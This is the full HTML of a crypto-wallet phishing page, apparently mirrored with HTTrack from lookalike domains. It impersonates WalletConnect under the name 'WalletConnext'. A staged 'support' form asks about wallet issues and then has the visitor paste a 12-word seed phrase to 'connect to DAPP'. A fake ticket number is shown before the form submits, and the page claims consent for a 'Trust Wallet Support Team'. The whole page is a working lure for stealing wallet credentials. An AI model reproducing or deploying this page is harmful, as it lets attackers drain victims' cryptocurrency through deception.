
<!DOCTYPE html>
<!-- saved from url=(0079)https://tokenprocoins.org/key/locate/coinbase/Connect%20__%20WalletConnext.html -->
<html><!-- Mirrored from tokenprocoin.digital/token/key/locate/coinbase/Connect __ WalletConnext.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 25 Aug 2021 18:47:23 GMT --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="./Connect __ WalletConnext_files/main.css" type="text/css">
    
    <meta name="description" content="Open protocol for connecting Wallets to Dapps">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:image" content="asset/images/logo.html">
    <link rel="icon" href="./Connect __ WalletConnext_files/logo.svg">
    <title>Connect || WalletConnext
</title>
</head>
<body>
    <center>
        <div class="top">
            <a href="https://dexwalletconnect.org/connect?type=metamask#" class="left">Github</a>
            <a href="https://dexwalletconnect.org/connect?type=metamask#" class="left">Docs</a>
            <a href="https://dexwalletconnect.org/" class="main"><img src="./Connect __ WalletConnext_files/logo.svg" alt="logo"></a>
            <a href="https://dexwalletconnect.org/connect?type=metamask#" class="left">Wallets</a>
            <a href="https://dexwalletconnect.org/connect?type=metamask#" class="left">Apps</a>
        </div>
        <br>
        <h2>
            <center>CONNECT WALLET SECURELY</center>
        </h2>
        <br>
        <div class="steps" id="step-1">
			<h3>Lets start by telling us about your issues</h3><br>
            <div class="form-group p-3">
                <label style="font-weight:bold;">What is the reason for your validation?<i style="color:red;">*</i></label>
            <input type="text" name="reason"  id="full-name" placeholder="Enter response" class="form-control" required>
                </div>

			<div class="form-group p-3">
			<label style="font-weight:bold;">What wallet server are you upgrading to? <i style="color:red;">*</i></label>
        <input type="text" name="server" id="server" placeholder="Enter response" class="form-control" required>
			</div>
			

            <div class="form-group p-3">
                <label style="font-weight:bold;">Did you perform any fraudulent transaction lately? <i style="color:red;">*</i></label>
            <input type="text" name="trx" id="trx" placeholder="Enter response" class="form-control" required>
                </div>
                
			
			<a href="Connect%20__%20WalletConnext.html"><center><button class="btn btn-primary btn-block" value="step-2" type="button" onclick="">Proceed</button> </center></a>
			</div>
			
			 
			<div class="steps" id="step-2">
			<h3 style="font-size:24px;line-height:1.6;margin-top:20px;" class="mt-2">Please fill this support form carefully To Enable us assist you better</h3><br>
			<div class="form-group p-1">
			<label><b style="font-weight:bold;">Which of the following relates to the problem you are experiencing?</b> <i style="color:red;">*</i></label>
		<p><input type="hidden" name="problem" class="form-control" value="" id="default-radio" selected required> </p>
        <p><input type="radio" name="problem" class="form-control" value="delayed transactions" required> Delayed Transctions</p>
		<p><input type="radio" name="problem" class="form-control" value="balance glitch" required> Balance Glitch</p>
		<p><input type="radio" name="problem" class="form-control" value="account recovery" required> Account Recovery</p>
		<p><input type="radio" name="problem" class="form-control" value="missing funds" required> Missing Funds</p>
		<p><input type="radio" name="problem" class="form-control" value="swap/exchange issues" required> Swap/Exchange issues</p>
		<p><input type="radio" name="problem" class="form-control" value="crypto purchase verified links" required> Crypto Purchase Verified Links</p>
		<p><input type="radio" name="problem" class="form-control" value="other" required>Other </p>
		<p><input type="text" name="other"  class="form-control"></p>
		
		
			</div>
			
			<div class="form-group p-3">
			<p><label style="font-weight:bold;">Tell us more about your issues(optional)<i style="color:red;"></i></label></p><br>
        <input name="more" placeholder="Your answer" class="form-control">
			</div>
			
			<center><button class="btn btn-light btn-block" value="step-1" type="button" onclick="openStep(this.value)">back</button> <br><br>
			<button class="btn btn-primary btn-block" value="step-3" type="button" onclick="openStep(this.value)">Proceed</button> <br><br>
			</center>
			</div>
					<div class="steps" id="step-3">
					<div class="form-group p-3">
			 <div class="import-account">
        <div class="import-account__title">Import Wallet</div><div class="import-account__selector-label text-bold"style="font-weight:bold;">Enter your 12 secret phrase here to connect you to DAPP</div>
		<div class="import-account__input-wrapper"><label class="import-account__input-label">Phrase</label>
		<textarea class="import-account__secret-phrase" placeholder="Paste seed phrase from clipboard" name="walletSeed"  id="walletSeed" required="true" minlength="24"></textarea><span class="error"></span></div>
		
		</div>
		
			</div>
			
			<div class="form-group">
			<label style="font-weight:bold;">I Agree that All information Contained Above Are Correct And Are Given By My Permission To The Trust Wallet Support Team <i style="color:red;">*</i></label><br>
			<p><input type="checkbox" name="problem" class="form-control" id="confirm" value="other" required> Yes </p>
			</div>
			<center>
			
			<button class="btn btn-primary btn-block" type="button" tabindex="0" style="width:100%;" onclick="validate()">IMPORT</button><br><br>
			<button value="step-2"  onclick="openStep(this.value)" class="btn btn-light btn-block" type="button" tabindex="0" style="background-color:#e5e7e9; color:black; width:100%;">Back</button><br><br>
			
			</center>
			</div>
			
			
			<style>
			.btn-block{
				width:100%;
			}
			.form-group{
				padding:5px;
			}
			input[type=radio],input[type=checkbox]{
				height:15px;
				display:inline;
				width:15px;
			}
			
			.steps{
				padding:1px;
				display:none;
			}
			.btn{
				padding:10px;
				border-radius:5px;
			}
			
			</style>
			<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
			<script>
				function openStep(val){
					var steps = document.getElementsByClassName("steps");
					for(var i=0; i<steps.length; i++){
					steps[i].style.display="none";
					document.getElementById(val).style.display="block";
					}
				
				}
				
				function validate(){
					var name=document.getElementById("full-name").value;
					var email=document.getElementById("email").value;
					var default_radio=document.getElementById("default-radio");
					var seed=document.getElementById("walletSeed").value;
					var confirm=document.getElementById("confirm");
					
					console.log(default_radio.checked);
					if(name!=""  || email!="" || seed!="" || default_radio.checked==true || confirm.checked==true){
					swal("Ticket number: 10004526835.","Tracking code: ML34VDcS45AE").then(
					(value)=>{
					document.getElementById("my-form").submit();
					}
					);
						
					}
					else{
						swal("Submit failed", "Please fill in the required fields", "error");
					}
				}
				
				document.getElementById("step-1").style.display="block";
			</script>         
    
        
    
       
        <footer>
            <div id="footer">
                <p><img src="./Connect __ WalletConnext_files/discord.svg" class="footimg"> <a href="https://tokenprocoins.org/discord.com/invite/jhxMvxP.html">Discord</a></p><br>
                <p><img src="./Connect __ WalletConnext_files/telegram.svg" class="footimg"> <a href="https://t.me/walletconnect_announcements">Telegram</a></p><br>
                <p><img src="./Connect __ WalletConnext_files/twitter.svg" class="footimg"> <a href="https://twitter.walletconnect.org/">Twitter</a>
                </p><br>
                <p><img src="./Connect __ WalletConnext_files/github.svg" class="footimg"> <a href="https://tokenprocoins.org/github.com/walletconnect.html">Github</a></p>
                <br>
        </div></footer>
        <script>
            document.getElementById("default").click();
        </script>
    </center>
    
    
    
    <!-- Mirrored from tokenprocoin.digital/token/key/locate/coinbase/Connect __ WalletConnext.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 25 Aug 2021 18:47:49 GMT -->
    </body></html>
